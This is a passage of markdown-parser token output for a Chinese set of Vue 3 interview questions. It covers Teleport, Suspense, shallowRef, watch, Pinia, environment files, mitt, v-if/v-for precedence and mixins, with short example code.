级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Teleport 用于将组件渲染到指定 DOM 节点。","text":"Teleport 用于将组件渲染到指定 DOM 节点。","tokens":[{"type":"text","raw":"Teleport 用于将组件渲染到指定 DOM 节点。","text":"Teleport 用于将组件渲染到指定 DOM 节点。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\n<template>\\n  <teleport to=\\"body\\">\\n    <div>Modal</div>\\n  </teleport>\\n</template>\\n\\n```","lang":"js","text":"\\n<template>\\n  <teleport to=\\"body\\">\\n    <div>Modal</div>\\n  </teleport>\\n</template>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 70. Vue 3 中的 Suspense 是什么？\\n\\n","depth":2,"text":"70. Vue 3 中的 Suspense 是什么？","tokens":[{"type":"text","raw":"70. Vue 3 中的 Suspense 是什么？","text":"70. Vue 3 中的 Suspense 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Suspense 用于处理异步组件的加载状态。","text":"Suspense 用于处理异步组件的加载状态。","tokens":[{"type":"text","raw":"Suspense 用于处理异步组件的加载状态。","text":"Suspense 用于处理异步组件的加载状态。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\n<template>\\n  <Suspense>\\n    <template #default>\\n      <AsyncComponent />\\n    </template>\\n    <template #fallback>\\n      <p>Loading...</p>\\n    </template>\\n  </Suspense>\\n</template>\\n\\n```","lang":"js","text":"\\n<template>\\n  <Suspense>\\n    <template #default>\\n      <AsyncComponent />\\n    </template>\\n    <template #fallback>\\n      <p>Loading...</p>\\n    </template>\\n  </Suspense>\\n</template>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 71. Vue 3 中的 Fragment 是什么？\\n\\n","depth":2,"text":"71. Vue 3 中的 Fragment 是什么？","tokens":[{"type":"text","raw":"71. Vue 3 中的 Fragment 是什么？","text":"71. Vue 3 中的 Fragment 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Fragment 允许组件返回多个根元素。","text":"Fragment 允许组件返回多个根元素。","tokens":[{"type":"text","raw":"Fragment 允许组件返回多个根元素。","text":"Fragment 允许组件返回多个根元素。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\n<template>\\n  <div>Hello</div>\\n  <div>Vue 3</div>\\n</template>\\n\\n```","lang":"js","text":"\\n<template>\\n  <div>Hello</div>\\n  <div>Vue 3</div>\\n</template>\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 72. Vue 3 中的 shallowRef 和 shallowReactive 是什么？\\n\\n","depth":2,"text":"72. Vue 3 中的 shallowRef 和 shallowReactive 是什么？","tokens":[{"type":"text","raw":"72. Vue 3 中的 shallowRef 和 shallowReactive 是什么？","text":"72. Vue 3 中的 shallowRef 和 shallowReactive 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"shallowRef：只对 .value 进行响应式处理。","text":"shallowRef：只对 .value 进行响应式处理。","tokens":[{"type":"text","raw":"shallowRef：只对 .value 进行响应式处理。","text":"shallowRef：只对 .value 进行响应式处理。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"shallowReactive：只对对象的第一层属性进行响应式处理。","text":"shallowReactive：只对对象的第一层属性进行响应式处理。","tokens":[{"type":"text","raw":"shallowReactive：只对对象的第一层属性进行响应式处理。","text":"shallowReactive：只对对象的第一层属性进行响应式处理。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { shallowRef, shallowReactive } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const count = shallowRef(0); // 基本类型\\n    const state = shallowReactive({ name: \'Vue 3\', info: { age: 3 } }); // 对象类型\\n\\n    return { count, state };\\n  }\\n};\\n\\n```","lang":"js","text":"\\nimport { shallowRef, shallowReactive } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const count = shallowRef(0); // 基本类型\\n    const state = shallowReactive({ name: \'Vue 3\', info: { age: 3 } }); // 对象类型\\n\\n    return { count, state };\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 73. Vue 3 中的 watch 如何监听多个数据？\\n\\n","depth":2,"text":"73. Vue 3 中的 watch 如何监听多个数据？","tokens":[{"type":"text","raw":"73. Vue 3 中的 watch 如何监听多个数据？","text":"73. Vue 3 中的 watch 如何监听多个数据？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"通过数组传入多个监听源。","text":"通过数组传入多个监听源。","tokens":[{"type":"text","raw":"通过数组传入多个监听源。","text":"通过数组传入多个监听源。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { ref, watch } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const count = ref(0);\\n    const name = ref(\'Vue 3\');\\n\\n    watch([count, name], ([newCount, newName], [oldCount, oldName]) => {\\n      console.log(\'count 或 name 变化了\');\\n    });\\n\\n    return { count, name };\\n  }\\n};\\n\\n```","lang":"js","text":"\\nimport { ref, watch } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    const count = ref(0);\\n    const name = ref(\'Vue 3\');\\n\\n    watch([count, name], ([newCount, newName], [oldCount, oldName]) => {\\n      console.log(\'count 或 name 变化了\');\\n    });\\n\\n    return { count, name };\\n  }\\n};\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 74. Vue 3 中的 onRenderTracked 是什么？\\n\\n","depth":2,"text":"74. Vue 3 中的 onRenderTracked 是什么？","tokens":[{"type":"text","raw":"74. Vue 3 中的 onRenderTracked 是什么？","text":"74. Vue 3 中的 onRenderTracked 是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"onRenderTracked 是调试钩子，用于跟踪渲染依赖。","text":"onRenderTracked 是调试钩子，用于跟踪渲染依赖。","tokens":[{"type":"text","raw":"onRenderTracked 是调试钩子，用于跟踪渲染依赖。","text":"onRenderTracked 是调试钩子，用于跟踪渲染依赖。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```js\\n\\nimport { onRenderTracked } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    onRenderTracked((event) => {\\n      console.log(\'跟踪到依赖:\', event);\\n    });\\n  }\\n};\\n\\n\\n```","lang":"js","text":"\\nimport { onRenderTracked } from \'vue\';\\n\\nexport default {\\n  setup() {\\n    onRenderTracked((event) => {\\n      console.log(\'跟踪到依赖:\', event);\\n    });\\n  }\\n};\\n\\n"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 74. Pinia与 Vuex 有哪些不同？\\n\\n","depth":2,"text":"74. Pinia与 Vuex 有哪些不同？","tokens":[{"type":"text","raw":"74. Pinia与 Vuex 有哪些不同？","text":"74. Pinia与 Vuex 有哪些不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"更符合 Composition API 思维模式","text":"更符合 Composition API 思维模式","tokens":[{"type":"text","raw":"更符合 Composition API 思维模式","text":"更符合 Composition API 思维模式","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"更好的 TypeScript 类型支持","text":"更好的 TypeScript 类型支持","tokens":[{"type":"text","raw":"更好的 TypeScript 类型支持","text":"更好的 TypeScript 类型支持","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 75. Vue 项目中如何实现多环境配置？\\n\\n","depth":2,"text":"75. Vue 项目中如何实现多环境配置？","tokens":[{"type":"text","raw":"75. Vue 项目中如何实现多环境配置？","text":"75. Vue 项目中如何实现多环境配置？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"可以使用 .env 文件来为不同环境配置变量。常见的环境文件包括：","text":"可以使用 .env 文件来为不同环境配置变量。常见的环境文件包括：","tokens":[{"type":"text","raw":"可以使用 .env 文件来为不同环境配置变量。常见的环境文件包括：","text":"可以使用 .env 文件来为不同环境配置变量。常见的环境文件包括：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"env：默认的环境配置（用于开发环境或没有明确环境时）。","text":"env：默认的环境配置（用于开发环境或没有明确环境时）。","tokens":[{"type":"text","raw":"env：默认的环境配置（用于开发环境或没有明确环境时）。","text":"env：默认的环境配置（用于开发环境或没有明确环境时）。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":".env.development：开发环境配置。","text":".env.development：开发环境配置。","tokens":[{"type":"text","raw":".env.development：开发环境配置。","text":".env.development：开发环境配置。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":".env.production：生产环境配置。","text":".env.production：生产环境配置。","tokens":[{"type":"text","raw":".env.production：生产环境配置。","text":".env.production：生产环境配置。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":".env.test：测试环境配置。","text":".env.test：测试环境配置。","tokens":[{"type":"text","raw":".env.test：测试环境配置。","text":".env.test：测试环境配置。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 76. EventBus 与 mitt 区别？\\n\\n","depth":2,"text":"76. EventBus 与 mitt 区别？","tokens":[{"type":"text","raw":"76. EventBus 与 mitt 区别？","text":"76. EventBus 与 mitt 区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"Vue2 中我们使用 EventBus 来实现跨组件之间的一些通信，它依赖于 Vue 自带的$on/$emit/$off等方法，这种方式使用非常简单方便，但如果使用不当也会带来难以维护的毁灭灾难。而 Vue3 中移除了这些相关方法，这意味着 EventBus 这种方式我们使用不了，Vue3 推荐尽可能使用props/emits、provide/inject、Vuex 等其他方式来替代。","text":"Vue2 中我们使用 EventBus 来实现跨组件之间的一些通信，它依赖于 Vue 自带的$on/$emit/$off等方法，这种方式使用非常简单方便，但如果使用不当也会带来难以维护的毁灭灾难。而 Vue3 中移除了这些相关方法，这意味着 EventBus 这种方式我们使用不了，Vue3 推荐尽可能使用props/emits、provide/inject、Vuex 等其他方式来替代。","tokens":[{"type":"text","raw":"Vue2 中我们使用 EventBus 来实现跨组件之间的一些通信，它依赖于 Vue 自带的$on/$emit/$off等方法，这种方式使用非常简单方便，但如果使用不当也会带来难以维护的毁灭灾难。而 Vue3 中移除了这些相关方法，这意味着 EventBus 这种方式我们使用不了，Vue3 推荐尽可能使用props/emits、provide/inject、Vuex 等其他方式来替代。","text":"Vue2 中我们使用 EventBus 来实现跨组件之间的一些通信，它依赖于 Vue 自带的$on/$emit/$off等方法，这种方式使用非常简单方便，但如果使用不当也会带来难以维护的毁灭灾难。而 Vue3 中移除了这些相关方法，这意味着 EventBus 这种方式我们使用不了，Vue3 推荐尽可能使用props/emits、provide/inject、Vuex 等其他方式来替代。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果 Vue3 内部的方式无法满足，官方建议使用一些外部的辅助库，例如：mitt。优点：","text":"如果 Vue3 内部的方式无法满足，官方建议使用一些外部的辅助库，例如：mitt。优点：","tokens":[{"type":"text","raw":"如果 Vue3 内部的方式无法满足，官方建议使用一些外部的辅助库，例如：mitt。优点：","text":"如果 Vue3 内部的方式无法满足，官方建议使用一些外部的辅助库，例如：mitt。优点：","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"非常小，压缩后仅有 200 bytes。","text":"非常小，压缩后仅有 200 bytes。","tokens":[{"type":"text","raw":"非常小，压缩后仅有 200 bytes。","text":"非常小，压缩后仅有 200 bytes。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"完整 TS 支持，源码由 TS 编码。","text":"完整 TS 支持，源码由 TS 编码。","tokens":[{"type":"text","raw":"完整 TS 支持，源码由 TS 编码。","text":"完整 TS 支持，源码由 TS 编码。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"跨框架，它并不是只能用在 Vue 中，React、JQ 等框架中也可以使用。","text":"跨框架，它并不是只能用在 Vue 中，React、JQ 等框架中也可以使用。","tokens":[{"type":"text","raw":"跨框架，它并不是只能用在 Vue 中，React、JQ 等框架中也可以使用。","text":"跨框架，它并不是只能用在 Vue 中，React、JQ 等框架中也可以使用。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"使用简单，仅有 on、emit、off 等少量实用API。","text":"使用简单，仅有 on、emit、off 等少量实用API。","tokens":[{"type":"text","raw":"使用简单，仅有 on、emit、off 等少量实用API。","text":"使用简单，仅有 on、emit、off 等少量实用API。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 77. v-if和v-for为什么不能连用？\\n\\n","depth":2,"text":"77. v-if和v-for为什么不能连用？","tokens":[{"type":"text","raw":"77. v-if和v-for为什么不能连用？","text":"77. v-if和v-for为什么不能连用？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"v-for优先于v-if被解析，从源码中发现，先处理静态节点，在处理once，在处理for，在处理if，代码显示for的优先级比if高，断点调试也证实for优先于if。在vue3中v-if优先于v-for被解析。","text":"v-for优先于v-if被解析，从源码中发现，先处理静态节点，在处理once，在处理for，在处理if，代码显示for的优先级比if高，断点调试也证实for优先于if。在vue3中v-if优先于v-for被解析。","tokens":[{"type":"text","raw":"v-for优先于v-if被解析，从源码中发现，先处理静态节点，在处理once，在处理for，在处理if，代码显示for的优先级比if高，断点调试也证实for优先于if。在vue3中v-if优先于v-for被解析。","text":"v-for优先于v-if被解析，从源码中发现，先处理静态节点，在处理once，在处理for，在处理if，代码显示for的优先级比if高，断点调试也证实for优先于if。在vue3中v-if优先于v-for被解析。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"如果同时使用，每次渲染都会先执行循环在判断条件，无论如何循环都避免不了，浪费了性能。","text":"如果同时使用，每次渲染都会先执行循环在判断条件，无论如何循环都避免不了，浪费了性能。","tokens":[{"type":"text","raw":"如果同时使用，每次渲染都会先执行循环在判断条件，无论如何循环都避免不了，浪费了性能。","text":"如果同时使用，每次渲染都会先执行循环在判断条件，无论如何循环都避免不了，浪费了性能。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"要避免出现这种情况，可以采用多层包裹来解决性能损耗问题。例如外层给标签绑定指令v-if或者是内层标签绑定v-if。","text":"要避免出现这种情况，可以采用多层包裹来解决性能损耗问题。例如外层给标签绑定指令v-if或者是内层标签绑定v-if。","tokens":[{"type":"text","raw":"要避免出现这种情况，可以采用多层包裹来解决性能损耗问题。例如外层给标签绑定指令v-if或者是内层标签绑定v-if。","text":"要避免出现这种情况，可以采用多层包裹来解决性能损耗问题。例如外层给标签绑定指令v-if或者是内层标签绑定v-if。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 78. mixin和mixis区别？\\n\\n","depth":2,"text":"78. mixin和mixis区别？","tokens":[{"type":"text","raw":"78. mixin和mixis区别？","text":"78. mixin和mixis区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（1分）\\n\\n","depth":4,"text":"解答（1分）","tokens":[{"type":"text","raw":"解答（1分）","text":"解答（1分）","escaped":false}]},{"type":"paragraph","raw":"mixin用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的。比如：可以全局混入封装好的ajax或者一些工具函数等。","text":"mixin用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的。比如：可以全局混入封装好的ajax或者一些工具函数等。","tokens":[{"type":"text","raw":"mixin用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的。比如：可以全局混入封装好的ajax或者一些工具函数等。","text":"mixin用于全局混入，会影响到每个组件实例，通常插件都是这样做初始化的。比如：可以全局混入封装好的ajax或者一些工具函数等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"paragraph","raw":"mixins用于单组件，是最常使用的扩展组件的方式。如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过mixins混入代码。比如上拉下拉加载数据这种逻辑等。","text":"mixins用于单组件，是最常使用的扩展组件的方式。如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过mixins混入代码。比如上拉下拉加载数据这种逻辑等。","tokens":[{"type":"text","raw":"mixins用于单组件，是最常使用的扩展组件的方式。如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过mixins混入代码。比如上拉下拉加载数据这种逻辑等。","text":"mixins用于单组件，是最常使用的扩展组件的方式。如果多个组件中有相同的业务逻辑，就可以将这些逻辑剥离出来，通过mixins混入代码。比如上拉下拉加载数据这种逻辑等。","escaped":false}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## 79. Vue 3的插槽（Slots）和Vue 2有何不同？\\n\\n","depth":2,"text":"79. Vue 3的插槽（Slots）和Vue 2有何不同？","tokens":[{"type":"text","raw":"79. Vue 3的插槽（Slots）和Vue 2有何不同？","text":"79. Vue 3的插槽（Slots）和Vue 2有何不同？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 